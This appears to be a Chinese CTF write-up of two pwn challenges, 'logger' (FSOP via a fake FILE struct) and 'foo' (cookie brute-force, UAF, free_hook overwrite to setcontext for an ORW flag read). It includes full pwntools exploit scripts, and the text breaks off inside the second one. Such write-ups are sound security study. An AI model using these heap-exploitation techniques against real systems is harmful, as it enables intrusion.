        <content type="html"><![CDATA[<h1 id="0x00-Summary"><a href="#0x00-Summary" class="headerlink" title="0x00 Summary"></a>0x00 Summary</h1><p>logger整数溢出+脏数据泄露。改bss上stderr指针为伪造的file结构体，2.23 FSOP攻击</p><p>foo：UAF，加Cookie检测，爆破出Cookie，然后利用scanf的trick进行malloc_consolidation来进行UAF，leak heap和libc，最后改hook为setcontext+0x35，orw读出flag</p><h1 id="0x01-logger"><a href="#0x01-logger" class="headerlink" title="0x01 logger"></a>0x01 logger</h1><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>第一个warning功能</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2020-iisc-xian-shang-sai-pwn-jie-ti/0.png"></div><p>第二个warning功能</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2020-iisc-xian-shang-sai-pwn-jie-ti/1.png"></div><p>第一个warning可以脏数据泄露libc或者栈地址，但是随后释放时通过memset就将数据清空了，PIE没开大概率和bss上数据有关联。</p><p>第二个warningOnce会将读取的字符数存放到任意位置。(如上图)</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这样我们就可以任意地址单字节写，在bss段伪造fake file，满足write_ptr&gt;write_base,mode&lt;=0即可进行FSOP攻击，vtable复写为写满one_gadget的地址，覆盖bss中stderr指针为伪造的fake file地址，最后通过exit控制程序流执行one_gadget。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8from pwn import *</span>debug <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>itv     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./logger"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># p = process('./feedback',env={'LD_PRELOAD':'./libc-2.23.so'})</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./logger"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.105.35.195"</span><span class="token punctuation">,</span><span class="token number">12432</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./logger"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">warning</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"Exit\n"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"Content:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">warningOnce</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sl<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> size<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        sa<span class="token punctuation">(</span><span class="token string">"Content:\n"</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        sa<span class="token punctuation">(</span><span class="token string">"Content:\n"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token operator">*</span>size<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"ID:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">error</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"Exit:\n"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"Content:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"Exit:\n"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>target_fake_file_addr <span class="token operator">=</span> <span class="token number">0x67f900</span>stderr_file_addr <span class="token operator">=</span> <span class="token number">0x67F7A0</span>index1 <span class="token operator">=</span> <span class="token number">0x67F7A0</span><span class="token operator">-</span><span class="token number">0x67F7B0</span>index2 <span class="token operator">=</span> <span class="token number">0x67f900</span><span class="token operator">-</span><span class="token number">0x67F7B0</span><span class="token comment" spellcheck="true"># 第一个：fp->mode&lt;=0 、 fp->IO_write_ptr>fp->_IO_write_base</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>warning<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token operator">*</span><span class="token number">0x37</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"1111111111111111111111111111111111111111111111111111111\n"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x00007ffff637f299</span><span class="token operator">+</span><span class="token number">0x7ffff6345000</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_static <span class="token operator">=</span> <span class="token number">0x7ffff6345000</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>fake_file <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000fbad2087</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff670a5c3</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff670a5c3</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>fake_file<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00007ffff670a5c4</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff670a620</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token punctuation">)</span>fake_file<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff670b770</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token punctuation">)</span>fake_file<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff6709660</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x67F7A0</span><span class="token operator">+</span><span class="token number">0x240</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0xf1147</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span>new_target_fake <span class="token operator">=</span> p64<span class="token punctuation">(</span>target_fake_file_addr<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>new_target_fake<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    warningOnce<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>new_target_fake<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>index1<span class="token operator">+</span>i<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># warningOnce()</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    warningOnce<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>fake_file<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>index2<span class="token operator">+</span>i<span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-foo"><a href="#0x02-foo" class="headerlink" title="0x02 foo"></a>0x02 foo</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2020-iisc-xian-shang-sai-pwn-jie-ti/2.png"></div>保护全开，同时还有沙箱保护，或许只能考虑ORW读flag了。<h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>程序五个功能：create、edit、show、delete和guess<br><strong>create</strong>：限制创建0x30大小的chunk，同时在heap_addr+0x28的位置赋值了一个cookie</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2020-iisc-xian-shang-sai-pwn-jie-ti/3.png"></div><p><strong>edit</strong>:可以写0x30的数据，需要检查cookie是否一致</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2020-iisc-xian-shang-sai-pwn-jie-ti/4.png"></div><p><strong>show</strong>：正常打印0x28的数据，需要cookie值</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2020-iisc-xian-shang-sai-pwn-jie-ti/5.png"></div><p><strong>delete</strong>：删除chunk，漏洞存在于指针没有清空，但同样删除前会检测cookie的值</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2020-iisc-xian-shang-sai-pwn-jie-ti/6.png"></div><p><strong>guess</strong>：create 0x190的chunk，进行检查cookie，其具体功能没有什么意义，但是create 0x190可以实现overlapping，同时进行UAF利用。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2020-iisc-xian-shang-sai-pwn-jie-ti/7.png"></div><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>首先我们想进行UAF，那么根据这几个功能的特点我们必须要知道cookie的值。我们可以通过create、edit、show这三个功能进行爆破得到cookie。</p><p>随后我们消耗空闲大于0x40的smallbin、0x40的fastbin，然后创建7个0x40的chunk，删除掉，利用scanf的特性输入大量数据使其分配一个大于smallbin阈值的chunk触发malloc_consolidation，此时这几个chunk将会合并分配给guess功能那个0x1a0的chunk，此时可以对这个大chunk进行编辑，在对应的位置写上cookie，再删除改fd，泄露libc（heap中有很多libc，malloc_consolidation合并的每个小chunk的fd都有libc地址）</p><p>最后再进行同样的UAF攻击改fd为free_hook，写setcontext+0x35,最后进行ORW读取flag</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>debug <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>itv     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./foo"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./foo"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"124.70.197.50"</span><span class="token punctuation">,</span><span class="token number">9010</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./foo"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">guess</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"cookie?"</span><span class="token punctuation">,</span>cookie<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">crack_cookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>res<span class="token operator">+</span>p8<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"Content"</span> <span class="token keyword">in</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                res <span class="token operator">+=</span> p8<span class="token punctuation">(</span>j<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">return</span> rescookie <span class="token operator">=</span> crack_cookie<span class="token punctuation">(</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"Cookie ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token operator">*</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token operator">*</span><span class="token number">0x1000</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>cookie<span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>guess<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>payload <span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>cookie<span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\xd0"</span>guess<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span>i<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"heap addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>target_heap <span class="token operator">=</span> heap_addr<span class="token operator">+</span><span class="token number">0x50</span>stack_heap <span class="token operator">=</span> heap_addr<span class="token number">-0x70</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>cookie<span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token 